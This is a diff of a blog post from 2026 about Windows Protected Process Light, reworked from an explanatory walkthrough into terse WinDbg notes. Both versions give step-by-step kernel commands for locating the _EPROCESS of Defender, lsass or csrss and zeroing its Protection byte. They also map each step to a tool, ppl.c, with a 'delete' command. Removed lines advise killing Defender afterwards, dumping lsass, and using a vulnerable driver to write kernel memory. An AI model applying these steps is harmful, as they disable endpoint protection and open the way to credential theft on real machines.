@@ -3,208 +3,163 @@ title: "Protected Process Light (PPL) — A WinDbg Deep Dive"
 date: 2026-08-24
 categories: [Windows Internals, Deep Dive]
 tags: [ppl, protected-process, eprocess, kernel, windbg, defender]
-summary: Why Defender and lsass cannot be opened — and how PPL works.
+summary: WinDbg notes — find EPROCESS.Protection and zero it.
 ---
 
-Windows Defender, lsass, csrss — these processes cannot be opened or killed even by SYSTEM. The mechanism is called **Protected Process Light (PPL)**. This post takes the four WinDbg commands needed to strip PPL and fully explains what each one does and why it works.
+# PPL notes (WinDbg)
 
----
+`OpenProcess` on Defender / lsass / csrss hits a second gate in `NtOpenProcess` (`PsGrantedAccess`): compare caller vs target **`_EPROCESS.Protection`**. Too low → `ACCESS_DENIED`. One byte.
 
-## What Is a Protected Process?
+`.reload /f` if names do not resolve. LiveKD is read-only — `eb` needs a writable kernel debug session.
 
-When you call `OpenProcess` on a target, the kernel runs an access check. Normally that check is about privileges and DACLs — if you're SYSTEM, you win. But for protected processes there's a second gate before any of that: the kernel compares your process's **protection level** against the target's. If yours isn't high enough, the open fails immediately with `ACCESS_DENIED`, no further checks done.
+Offsets (`Protection`, `ActiveProcessLinks`, `ImageFileName`) are **build-specific**. Always `dt nt!_EPROCESS` on the target. `ppl.c` stores them as `EPROC_*_OFF`.
 
-This gate lives in `PsGrantedAccess` inside `NtOpenProcess`. It reads a single byte from the target's `_EPROCESS` structure — the `Protection` field — and makes the decision there. No user-mode code, no policy, no privilege can bypass it. The only way around it is to modify that byte directly in the kernel.
-
----
-
-## The `_EPROCESS` Structure
-
-![_EPROCESS key fields layout](/assets/images/ppl-eprocess-layout.svg)
-
-Every running process is represented in the kernel by an `_EPROCESS` structure. It's a large (~0x900 byte) object that holds everything about a process: its PID, its token, its handle table, its virtual address space, its image name, and its protection level.
-
-WinDbg can show you the layout of any kernel structure without needing a live address. Passing `0` as the address just queries the type:
-
-```
-dt nt!_EPROCESS 0
-```
-
-This dumps every field with its offset. The one we care about:
-
-```
-dt nt!_EPROCESS 0 Protection
-```
-```
-nt!_EPROCESS
-   +0x6fa Protection : _PS_PROTECTION
-```
-
-`+0x6fa` means the Protection field lives 1786 bytes into the `_EPROCESS` structure. This offset is **build-specific** — it shifts between Windows versions and even cumulative updates. Always query it on your specific target before using it.
+![layout](/assets/images/ppl-eprocess-layout.svg)
+![byte](/assets/images/ppl-protection-byte.svg)
 
 ---
 
-## The Protection Byte — `_PS_PROTECTION`
-
-![_PS_PROTECTION bitfield layout](/assets/images/ppl-protection-byte.svg)
-
-`_PS_PROTECTION` is a one-byte bitfield. You can inspect its layout the same way:
+## `_PS_PROTECTION` (1 byte)
 
 ```
 dt nt!_PS_PROTECTION
 ```
+
 ```
-nt!_PS_PROTECTION
-   +0x000 Type   : Pos 0, 3 Bits
-   +0x000 Audit  : Pos 3, 1 Bit
-   +0x000 Signer : Pos 4, 4 Bits
++0x000  Type    bits 0–2   0=None  1=PPL  2=PP
++0x000  Audit   bit 3      usually 0
++0x000  Signer  bits 4–7   trust rank
 ```
 
-One byte, three fields packed into it:
+Byte = `(Signer << 4) | Type`. Type `0` → not protected (signer ignored).
 
-- **Type** (bits 2–0): The protection strength.
-  - `0` = None (regular process)
-  - `1` = ProtectedLight (PPL)
-  - `2` = Protected (full PP — strongest)
+| Signer | Who | Example |
+|--------|-----|---------|
+| 0 | None | normal process |
+| 3 | Antimalware | `MsMpEng.exe` → `0x31` |
+| 4 | Lsa | `lsass.exe` if RunAsPPL → `0x41` |
+| 6 | WinTcb | `csrss.exe` PP → `0x62` |
 
-- **Audit** (bit 3): Always `0` in practice. Reserved for auditing future violations.
-
-- **Signer** (bits 7–4): The signing authority that vouches for this binary. Higher signer = higher trust. A PPL process can only open a target with the same or lower signer rank.
-
-| Signer value | Identity | Example process |
-|---|---|---|
-| 0 | None | Regular processes |
-| 3 | Antimalware | MsMpEng.exe, MpDefenderCore |
-| 4 | Lsa | lsass.exe (when RunAsPPL is enabled) |
-| 6 | WinTcb | csrss.exe, smss.exe, wininit.exe |
-
-To read the full byte as a number: `(Signer << 4) | Type`. So MsMpEng has `(3 << 4) | 1 = 0x31`.
-
-Why does zeroing the whole byte work? Because `Type = 0` means "not protected" regardless of the Signer value. The kernel checks Type first — if it's 0, the process gets no protection at all.
+![signers](/assets/images/ppl-signer-values.svg)
 
 ---
 
-## Step 1 — Find the Process
+## 1. Protection offset
+
+```
+dt nt!_EPROCESS 0 Protection
+```
+
+Type-only (`0` = no memory read). Example: `+0x5FA` or `+0x6FA` — **yours may differ**.
+
+Also note:
+
+```
+dt nt!_EPROCESS 0 ActiveProcessLinks
+dt nt!_EPROCESS 0 ImageFileName
+```
+
+`ImageFileName` is **15** chars (`MpDefenderCoreService.exe` → `MpDefenderCore`).
+
+---
+
+## 2. Find `_EPROCESS`
+
+### WinDbg shortcut
 
 ```
 !process 0 0 MsMpEng.exe
 ```
 
-`!process` is a WinDbg extension that walks the kernel's `PsActiveProcessLinks` list — a circular linked list that connects every `_EPROCESS` in the system. The arguments mean:
+Address after `PROCESS` is the `_EPROCESS`.
 
-- First `0` — search all processes (not just a specific address)
-- Second `0` — minimal output (just the header, not full thread list)
-- `MsMpEng.exe` — filter by image name
+### Walk (what `ppl.c` does)
 
-**Example output:**
 ```
-PROCESS ffffd209`089a3080
-    SessionId: 0  Cid: 0cac    Peb: 5cb8f37000  ParentCid: 02bc
-    DirBase: 16108b002  ObjectTable: ffffe303d3e71b40  HandleCount: 803.
-    Image: MsMpEng.exe
+dq nt!PsInitialSystemProcess L1
 ```
 
-The address after `PROCESS` — `ffffd209089a3080` — is the kernel virtual address of MsMpEng's `_EPROCESS`. Save this. Every field access in the next steps is computed as `EPROCESS_base + field_offset`.
+That pointer = System `_EPROCESS` (list head).
 
-Note that the image name shown here comes from `EPROCESS.ImageFileName`, which is a 15-character array. Long names get truncated — `MpDefenderCoreService.exe` appears as `MpDefenderCore`. This is normal; the kernel stores only the short name.
+```
+? nt!PsInitialSystemProcess - nt
+```
+
+Then:
+
+```
+dt nt!_EPROCESS <ep> ImageFileName
+dt nt!_PS_PROTECTION <ep>+<Protection>
+dq <ep>+<ActiveProcessLinks> L1
+```
+
+Right-hand Flink points **into** the next `LIST_ENTRY`, not the next `_EPROCESS`:
+
+```
+next_ep = Flink - ActiveProcessLinks
+```
+
+Stop when `next_ep` equals System. Empty / bad Flink → break.
 
 ---
 
-## Step 2 — Find the Protection Field Offset
+## 3. Read the byte
 
 ```
-dt nt!_EPROCESS 0 Protection
-```
-```
-nt!_EPROCESS
-   +0x6fa Protection : _PS_PROTECTION
+dt nt!_PS_PROTECTION <ep>+<Protection>
+db <ep>+<Protection> L1
 ```
 
-You already know from the section above that the field is `_PS_PROTECTION` — but this command tells you *where* it sits in memory on this specific build. The `0` trick (passing null as the address) is safe because you're asking WinDbg to describe the type layout, not read memory at that address.
+Example `0x31`: Type=1 (PPL), Signer=3 (Antimalware). `0x00` = already unprotected.
 
-On Windows 10 18363, it's `+0x6FA`. On a newer build it may be different. If you hardcode this offset into a tool and run it on the wrong build, you'll corrupt unrelated kernel memory.
+`Protection` is often **not 4-byte aligned** (e.g. `…FA`). `dd` a DWORD and shift, or `db` one byte.
 
 ---
 
-## Step 3 — Read the Protection Level
-
-Now use the EPROCESS address from Step 1 and the offset from Step 2:
+## 4. Zero it
 
 ```
-dt nt!_PS_PROTECTION ffffd209`089a3080+0x6fa
+eb <ep>+<Protection> 0
 ```
 
-WinDbg evaluates `ffffd209089a3080 + 0x6fa = ffffd209089a376a` and reads a byte there, interpreting it as `_PS_PROTECTION`:
+Type/Audit/Signer all 0. Process still runs — only the open-gate is gone.
+
+Verify:
 
 ```
-nt!_PS_PROTECTION
-   +0x000 Level  : 0x31 '1'
-   +0x000 Type   : 0y001
-   +0x000 Audit  : 0y0
-   +0x000 Signer : 0y0011
+db <ep>+<Protection> L1
 ```
 
-WinDbg's `0y` prefix means binary. Reading it:
-- `Type = 0y001 = 1` → ProtectedLight (PPL) ✓
-- `Signer = 0y0011 = 3` → Antimalware ✓
-- `Level = 0x31` → `(3 << 4) | 1 = 0x31` ✓
-
-This confirms MsMpEng is running as PPL-Antimalware. lsass would show `0x41` if `RunAsPPL` is enabled, or `0x00` if not — many systems ship with lsass unprotected, in which case you can dump it from usermode with no kernel access required.
+Do not `ed` a DWORD at an unaligned address — neighbouring `_EPROCESS` fields share that dword. `ppl.c` uses read-modify-write (`kwrite8`).
 
 ---
 
-## Step 4 — Remove the Protection
+## Commands
 
-```
-eb ffffd209`089a3080+0x6fa 0
-```
-
-`eb` = **edit byte**. WinDbg computes the address, locates the physical page, and writes `0x00` directly to kernel memory. This is possible because the kernel debugger has a privileged connection to the target — it bypasses all normal access controls.
-
-Writing `0` clears all three fields simultaneously:
-- Type → 0 (None — no longer protected)
-- Audit → 0
-- Signer → 0
-
-**Verify it worked:**
-
-```
-dt nt!_PS_PROTECTION ffffd209`089a3080+0x6fa
-```
-```
-nt!_PS_PROTECTION
-   +0x000 Level  : 0x0
-   +0x000 Type   : 0y000
-   +0x000 Signer : 0y0000
-```
-
-MsMpEng is now a completely ordinary process. Any usermode code running as SYSTEM (or even with `SeDebugPrivilege`) can now call `OpenProcess(PROCESS_TERMINATE, ...)` and succeed.
-
-**Important:** Removing PPL does not stop Defender. It only removes the kernel barrier that prevented you from opening the process. You still have to terminate it yourself after unprotecting it.
+| Cmd | Does |
+|-----|------|
+| `dt` | type / field at address |
+| `dq` / `db` | dump QWORD / bytes |
+| `eb` | edit byte |
+| `!process` | find `_EPROCESS` by name |
+| `poi(addr)` | read pointer |
 
 ---
 
-## Protection Level Reference
+## How `ppl.c` maps to these notes
 
-![PS_PROTECTED_SIGNER all values and example processes](/assets/images/ppl-signer-values.svg)
+WinDbg uses **symbols**. The C tool uses **kernel base + RVA**.
 
-| Process | Type | Signer | Byte | Notes |
-|---------|------|--------|------|-------|
-| MsMpEng.exe | PPL (1) | Antimalware (3) | `0x31` | Windows Defender scanner |
-| MpDefenderCore | PPL (1) | Antimalware (3) | `0x31` | Truncated from MpDefenderCoreService.exe |
-| lsass.exe | PPL (1) | Lsa (4) | `0x41` | Only if `RunAsPPL = 1` in registry |
-| csrss.exe | PP (2) | WinTcb (6) | `0x62` | Full PP — stronger than PPL |
-| smss.exe | PP (2) | WinTcb (6) | `0x62` | Full PP |
-| Regular process | — | — | `0x00` | No protection |
+| Post | WinDbg | `ppl.c` |
+|------|--------|---------|
+| RVA | `? nt!PsInitialSystemProcess - nt` | `RVA_PS_INITIAL_SYSTEM` |
+| Head | `dq nt!PsInitialSystemProcess` | `kread64(kbase + RVA)` |
+| Name | `dt … ImageFileName` | `kread_name(ep + EPROC_NAME_OFF)` |
+| Links | `dq ep+ActiveProcessLinks` | `kread64(ep + EPROC_LINKS_OFF)` |
+| Next | `Flink - offset` | `ep = flink - EPROC_LINKS_OFF` |
+| Prot | `db ep+Protection` | `read_prot(ep)` (DWORD + shift) |
+| Zero | `eb ep+Protection 0` | `kwrite8(ep + EPROC_PROT_OFF, 0)` |
 
-> **lsass tip:** Before attempting any kernel manipulation to target lsass, run `dt nt!_PS_PROTECTION lsass_eprocess+0x6fa` first. If it shows `0x00` already, the system hasn't enabled RunAsPPL and you can dump lsass directly from usermode — no driver needed.
+`list` = walk, print if byte ≠ 0. `delete <name>` = walk, `kwrite8` 0 on match.
 
----
-
-## Key Points
-
-- PPL is a **single byte** in `_EPROCESS`. There is no complex policy engine — zeroing it is sufficient.
-- The offset `+0x6FA` is build-specific. Always verify with `dt nt!_EPROCESS 0 Protection` on your target.
-- `_PS_PROTECTION` packs two meaningful fields: **Type** (protection strength) and **Signer** (trust rank). The kernel checks both when deciding if one process can open another.
-- WinDbg's `eb` command writes directly to kernel memory via the debugger's privileged channel. Without a debugger, you need an equivalent kernel write primitive — such as a vulnerable driver.
-- Removing PPL drops the process to fully unprotected but does not terminate it. Kill it after.
+Session name / `!process` are WinDbg-only. `ppl.c` always walks from System.
